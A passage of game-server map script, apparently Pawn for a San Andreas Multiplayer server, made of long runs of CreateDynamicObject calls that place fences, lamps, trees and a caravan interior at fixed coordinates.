	CreateDynamicObject(2279,2389.7100000,-1711.8900000,-45.7400000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2740,2391.4100000,-1716.1700000,-44.8800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(18652,2391.4100000,-1716.1800000,-43.8600000,90.0000000,0.0000000,-90.0000000); //
	
	// ------------------ Interior Caravana Tropic ------------------
	
	CreateDynamicObject(11292,1610.4042970,615.5779420,2.5935940,0.0000000,0.0000000,303.7500000); //
	CreateDynamicObject(2395,1609.0966800,615.2355350,1.4351970,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,1609.1684570,618.0935060,1.2165200,0.0000000,0.0000000,337.5000000); //
	CreateDynamicObject(1536,1613.0253910,612.0618290,1.3348500,0.0000000,0.0000000,33.7500000); //
	CreateDynamicObject(1754,1609.3242190,617.7528080,1.2384460,0.0000000,0.0000000,33.7500000); //
	CreateDynamicObject(2139,1611.6987300,611.8114010,1.3176480,0.0000000,0.0000000,123.7499000); //
	CreateDynamicObject(2141,1611.1064450,612.6116330,1.3695930,0.0000000,0.0000000,123.7499000); //
	CreateDynamicObject(2208,1609.4487300,614.5492550,1.4254900,0.0000000,0.0000000,303.7500000); //
	CreateDynamicObject(2292,1609.4506840,617.5669560,1.2206470,0.0000000,0.0000000,348.7500000); //
	CreateDynamicObject(2291,1609.3691410,616.2492070,1.2168780,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2291,1609.3657230,615.3750610,1.2021570,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2291,1609.7709960,617.5719600,1.2163750,0.0000000,0.0000000,337.5000000); //
	CreateDynamicObject(2291,1610.5678710,617.2466430,1.2163750,0.0000000,0.0000000,337.5000000); //
	CreateDynamicObject(2291,1611.3779300,616.9000850,1.2217090,0.0000000,0.0000000,337.5000000); //
	CreateDynamicObject(2291,1609.3774410,614.4866330,1.2057090,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1664,1610.4672850,613.4345090,2.4581880,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1667,1610.0874020,614.1037600,2.3794010,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1667,1610.0385740,614.2913820,2.3880650,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1668,1610.6269530,613.2546390,2.4571930,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1669,1610.3325200,613.6105960,2.4655270,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1659,1610.1938480,616.5632930,3.7793660,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1717,1612.5766600,616.1807860,1.3045390,0.0000000,0.0000000,202.5000000); //
	CreateDynamicObject(1736,1610.1040040,613.8419190,3.2585570,0.0000000,0.0000000,123.7499000); //
	CreateDynamicObject(1828,1611.9667970,614.0911250,1.3792790,0.0000000,0.0000000,303.7500000); //
	CreateDynamicObject(2002,1612.9848630,614.6438600,1.3551100,0.0000000,0.0000000,303.7500000); //
	CreateDynamicObject(2103,1609.4838870,614.3743290,2.2902380,0.0000000,0.0000000,123.7500000); //
	
	// --------------------------------------------------------------------------------------------

	CreateDynamicObject(10377, 1481.05005, -1787.24878, 30.60140,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 2862.73145, -1544.56787, 9.90520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 2723.20190, -1493.05396, 9.90520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 2825.33032, -1542.07422, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 2838.58838, -1541.84790, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 2852.13647, -1542.74084, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 4376.38574, -9237.58398, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 2611.49170, -1489.33374, 9.90520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 2532.54907, -1487.82117, 9.90520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 2482.99683, -1475.94885, 9.90520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 2369.90088, -1452.88977, 9.90520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 2456.35156, -1460.59558, 9.90520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 2265.67554, -1438.51648, 16.90520,   0.00000, 0.00000, -20.00000);
	CreateDynamicObject(11696, 2222.18188, -1412.40784, 16.90520,   0.00000, 0.00000, -20.00000);
	CreateDynamicObject(11696, 2078.30127, -1360.54919, 16.90520,   0.00000, 0.00000, -93.83997);
	CreateDynamicObject(11696, 1821.46680, -1377.42505, 16.90520,   0.00000, 0.00000, 3.00000);
	CreateDynamicObject(11696, 1734.34570, -1377.08521, 16.90520,   0.00000, 0.00000, -7.50000);
	CreateDynamicObject(11696, 1599.79736, -1371.56433, 24.40520,   0.00000, 0.00000, 7.50000);
	CreateDynamicObject(11696, 1509.85352, -1413.79797, 24.40520,   0.00000, 0.00000, 25.97999);
	CreateDynamicObject(11696, 1413.17908, -1392.92847, 24.40520,   0.00000, 0.00000, 7.50000);
	CreateDynamicObject(11696, 1096.61963, -1277.32446, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 1335.45435, -1460.65173, 24.40520,   0.00000, 0.00000, -101.80000);
	CreateDynamicObject(19529, 965.76642, -1699.79175, 12.46670,   0.00000, 0.00000, 359.29471);
	CreateDynamicObject(19529, 961.43262, -1704.33167, 12.46670,   0.00000, 0.00000, 352.73361);
	CreateDynamicObject(19543, 1020.51532, -1757.17834, 12.53470,   -0.29600, 0.00000, 0.00000);
	CreateDynamicObject(19543, 996.13678, -1775.58228, 12.53470,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19543, 1006.24518, -1767.38660, 12.53470,   -0.14400, 0.00000, 0.00000);
	CreateDynamicObject(19543, 997.51813, -1764.52771, 12.53470,   -0.14400, 0.00000, 0.00000);
	CreateDynamicObject(19543, 982.49182, -1762.77966, 12.53470,   -0.14400, 0.00000, 0.00000);
	CreateDynamicObject(19543, 996.12311, -1771.04016, 13.12870,   -0.67100, 0.00000, -104.00000);
	CreateDynamicObject(19543, 982.63800, -1775.14819, 4.55602,   -0.67100, 90.00000, -104.00000);
	CreateDynamicObject(19543, 982.58685, -1774.94751, 4.55602,   -0.67100, 90.00000, 257.09805);
	CreateDynamicObject(19543, 975.30951, -1772.48926, 4.64702,   -0.67100, 90.00000, -100.48500);
	CreateDynamicObject(11696, 211.54100, -1382.29126, 24.40520,   0.00000, 0.00000, 36.74000);
	CreateDynamicObject(11696, -268.41043, -2026.32654, 24.40520,   0.00000, 0.00000, 95.08001);
	CreateDynamicObject(11696, 1143.42200, -1273.74451, 24.40520,   0.00000, 0.00000, -92.08006);
	CreateDynamicObject(11696, 1124.78198, -1273.74451, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 471.89053, -1313.66687, 24.40520,   0.00000, 0.00000, 112.87987);
	CreateDynamicObject(11696, 1073.66370, -1275.66223, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 1052.25098, -1279.19568, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 999.44757, -1275.93140, 24.40520,   0.00000, 0.00000, -90.22011);
	CreateDynamicObject(11696, 965.30701, -1274.52209, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 913.10687, -1276.34534, 24.40520,   0.00000, 0.00000, -90.82013);
	CreateDynamicObject(11696, 851.94214, -1276.61755, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 796.07281, -1276.83484, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 730.98694, -1277.99243, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 665.81299, -1276.49927, 24.40520,   0.00000, 0.00000, -92.08010);
	CreateDynamicObject(11696, 588.49841, -1283.04541, 24.40520,   0.00000, 0.00000, -86.26012);
	CreateDynamicObject(11696, 293.04364, -1342.85938, 24.40520,   0.00000, 0.00000, 131.59981);
	CreateDynamicObject(11696, 522.79169, -1293.09753, 24.40520,   0.00000, 0.00000, -80.26008);
	CreateDynamicObject(11696, 477.90237, -1305.30042, 24.40520,   0.00000, 0.00000, -73.36006);
	CreateDynamicObject(11696, 355.41187, -1305.81177, 24.40520,   0.00000, 0.00000, -63.22005);
	CreateDynamicObject(11696, 315.64316, -1335.39441, 24.40520,   0.00000, 0.00000, -63.22005);
	CreateDynamicObject(11696, 1311.63989, -1402.94971, 24.40520,   0.00000, 0.00000, 6.16000);
	CreateDynamicObject(713, 1502.00708, -1622.01904, 13.45313,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1475.18164, -1661.91675, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1462.67480, -1659.26318, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1479.26794, -1661.91675, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1483.35632, -1661.91675, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1487.44580, -1661.91675, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1475.18164, -1669.91504, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1479.26794, -1669.91504, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1483.35632, -1669.91504, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1487.44580, -1669.91504, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19366, 1469.35986, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1469.35986, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1469.35986, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1472.85657, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1476.34924, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1479.84424, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1483.33447, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1486.82825, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1490.31885, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1465.86780, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1462.37634, -1665.90002, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1472.85986, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1476.34924, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1476.34924, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1472.85657, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1479.84424, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1479.84424, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1483.33447, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1483.33447, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1486.82825, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1486.82825, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1490.31885, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1490.31885, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1465.86780, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1465.86780, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1462.37634, -1669.10254, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19366, 1462.37634, -1662.68945, 14.99480,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(14409, 1466.77307, -1659.26318, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1470.87256, -1659.26318, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1474.97034, -1659.26318, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1479.06799, -1659.26318, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1483.16492, -1659.26318, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1487.26135, -1659.26318, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1490.00928, -1659.26318, 11.89560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14409, 1462.67480, -1672.52820, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1466.77307, -1672.52820, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1470.87256, -1672.52820, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1474.97034, -1672.52820, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1479.06799, -1672.52820, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1483.16492, -1672.52820, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1487.26135, -1672.52820, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14409, 1490.00928, -1672.52820, 11.89560,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19362, 1460.53833, -1669.10388, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.53833, -1665.90405, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.53833, -1662.69958, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.53833, -1659.49695, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.53833, -1672.30066, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.14807, -1672.30066, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.36011, -1669.10388, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.36011, -1665.90405, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.36011, -1662.69958, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.36011, -1659.49695, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1460.36011, -1672.30066, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.14807, -1669.09375, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.14807, -1662.68054, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.14807, -1665.89026, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.14807, -1659.46765, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.32324, -1659.46765, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.32324, -1665.89185, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.32324, -1662.67920, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.32324, -1669.10034, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, 1492.32324, -1672.30066, 14.17520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3515, 1467.25305, -1665.75024, 15.25600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3515, 1479.52185, -1635.66565, 12.95510,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1455.42163, -1615.03589, 14.24000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1497.35657, -1624.84949, 14.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(9131, 1466.09839, -1761.78589, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1503.72424, -1615.03589, 14.24000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1461.80676, -1620.78198, 14.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1215, 1497.33667, -1614.99841, 14.72060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1491.61304, -1684.24255, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1461.80676, -1624.85144, 14.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1497.33667, -1620.78198, 14.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1379.81531, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9131, 1497.33667, -1614.99841, 13.68650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1481.77405, -1627.12073, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1459.48840, -1615.03589, 14.24000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1499.65405, -1615.03589, 14.24000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1460.47412, -1673.71716, 13.44480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1492.24817, -1673.71716, 13.44480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1492.24817, -1673.71716, 13.44480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1492.24817, -1673.71716, 13.44480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1460.47412, -1658.10803, 13.44480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1216, 1459.99780, -1665.90076, 13.69380,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1216, 1459.99780, -1659.52905, 13.69380,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1216, 1459.99780, -1662.73657, 13.69380,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(7913, 1497.13892, -1665.71826, 24.86180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(7913, 1495.13660, -1665.71826, 24.86185,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(7913, 1498.86609, -1665.71826, 24.86180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(7913, 1497.99902, -1665.71826, 24.86180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(7913, 1495.75647, -1665.71826, 24.86180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(7913, 1496.28223, -1665.71826, 24.86180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1479.54883, -1688.30225, 13.75720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1479.54883, -1693.67615, 13.75720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1479.54883, -1699.05444, 13.75720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1479.54883, -1704.43201, 13.75720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(673, 1479.53040, -1686.03638, 12.39840,   356.85840, 0.00000, 0.00000);
	CreateDynamicObject(673, 1479.53040, -1691.07568, 12.43231,   356.85840, 0.00000, 0.00000);
	CreateDynamicObject(673, 1479.53040, -1696.44421, 12.39840,   356.85840, 0.00000, 0.00000);
	CreateDynamicObject(673, 1479.53040, -1701.86475, 12.39840,   356.85840, 0.00000, 0.00000);
	CreateDynamicObject(673, 1479.51074, -1707.25671, 12.39840,   356.85840, 0.00000, 0.00000);
	CreateDynamicObject(673, 1479.53040, -1712.09033, 12.39840,   356.85840, 0.00000, 0.00000);
	CreateDynamicObject(970, 1461.80676, -1616.70886, 14.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1500.15686, -1682.16821, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1491.61304, -1688.31116, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1491.61304, -1692.37878, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1491.61304, -1696.44666, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1491.61304, -1700.51807, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1491.61304, -1704.58704, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1491.61304, -1708.65466, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1502.22705, -1711.76990, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1493.70068, -1713.84265, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1497.77112, -1713.84265, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1465.41699, -1711.76990, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1502.22705, -1708.65466, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1502.22705, -1704.58704, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1502.22705, -1700.51807, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1502.22705, -1696.44666, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1502.22705, -1692.37878, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1502.22705, -1688.31116, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1502.22827, -1684.24255, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1500.15686, -1713.84265, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1497.77112, -1682.16821, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1463.32825, -1682.16821, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1280, 1489.21021, -1713.70764, 13.45310,   360.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1489.21021, -1704.59375, 13.45310,   360.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1489.21021, -1693.73438, 13.45310,   360.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1489.21021, -1682.67188, 13.45310,   360.00000, 0.00000, 0.00000);
	CreateDynamicObject(3515, 1459.84827, -1697.77930, 14.32549,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3515, 1479.52185, -1644.28943, 12.95510,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3515, 1475.32202, -1639.97729, 12.95510,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3515, 1483.72046, -1639.97729, 12.95510,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1461.78235, -1614.99841, 14.72060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1477.32605, -1627.12073, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1485.90417, -1628.63159, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1489.23621, -1631.44592, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1491.44983, -1635.24805, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1492.21045, -1639.54224, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1491.51257, -1643.86646, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1489.35034, -1647.71216, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1485.91235, -1650.58301, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1481.76855, -1652.12085, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1469.78271, -1631.41760, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1477.34863, -1652.14429, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1473.19116, -1650.61108, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1469.77368, -1647.76941, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1467.61511, -1644.00134, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1466.82666, -1639.58142, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1467.63904, -1635.25842, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1473.21143, -1628.62891, 13.93940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9833, 1496.75830, -1688.83130, 15.12660,   0.00000, 0.00000, 72.18000);
	CreateDynamicObject(9833, 1459.84827, -1707.59778, 15.12660,   0.00000, 0.00000, 85.86000);
	CreateDynamicObject(3515, 1486.56787, -1665.75024, 15.25600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1491.61304, -1711.76990, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1465.41699, -1708.65466, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1465.41699, -1704.58704, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1465.41699, -1700.51807, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1465.41699, -1692.37878, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1465.41699, -1696.44666, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1465.41699, -1688.31116, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1454.81128, -1684.24255, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1493.70068, -1682.16821, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1460.07068, -1682.16821, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1456.87634, -1682.16821, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1465.41699, -1684.24255, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1454.81128, -1688.31116, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1454.81128, -1692.37878, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1454.81128, -1696.44666, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1454.81128, -1700.51807, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1454.81128, -1704.58704, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1454.81128, -1708.65466, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1454.81128, -1711.76990, 14.00030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1456.87634, -1713.84265, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1460.07068, -1713.84265, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1463.32825, -1713.84265, 14.00030,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1280, 1468.15613, -1713.46362, 13.45310,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1280, 1468.15613, -1694.04688, 13.45310,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1280, 1468.15613, -1682.71875, 13.45310,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1300, 1468.12183, -1687.03601, 13.21880,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1300, 1489.02856, -1707.95850, 13.21880,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1300, 1468.12183, -1697.90906, 13.21880,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1300, 1468.12183, -1707.95850, 13.21880,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1300, 1489.02856, -1697.90906, 13.21880,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1300, 1489.02856, -1687.03601, 13.21880,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(9833, 1459.84827, -1688.83130, 15.12660,   0.00000, 0.00000, 72.18000);
	CreateDynamicObject(3515, 1496.75830, -1697.77930, 14.23679,   0.00000, 0.00000, 359.69391);
	CreateDynamicObject(9833, 1496.74597, -1707.62329, 15.12660,   0.00000, 0.00000, 85.86000);
	CreateDynamicObject(9339, 1455.95764, -1718.80176, 13.23330,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(9339, 1519.29968, -1708.35437, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1454.42957, -1721.80859, 13.23330,   0.00000, 0.00000, -90.00000);
